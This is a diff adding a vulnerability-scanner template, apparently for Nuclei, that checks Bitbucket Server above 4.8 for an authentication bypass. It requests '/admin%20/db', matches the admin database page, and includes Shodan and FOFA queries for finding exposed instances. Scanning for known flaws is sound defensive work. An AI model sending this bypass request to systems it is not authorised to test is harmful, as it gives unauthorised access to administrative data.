@@ -1,0 +1,34 @@
+id: bitbucket-auth-bypass
+
+info:
+  name: Bitbucket Server > 4.8 - Authentication Bypass
+  author: xc
+  severity: critical
+  description: |
+    There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Log in - Bitbucket"
+    fofa-query: title="Log in - Bitbucket"
+  tags: misconfig,atlassian,bitbucket,auth-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin%20/db"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<h2>Database</h2>"
+          - "Migrate database"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a0047304502201946e48b08668a0597ded653e54bb13c9963cbdb12f6346ec925a3e6e076ed1b022100a2f3c87d0283a2d813f657de5284441fcb2c45757e5892bac85dee2fbec0a7ed:922c64590222798bb761d5b6d8e72950
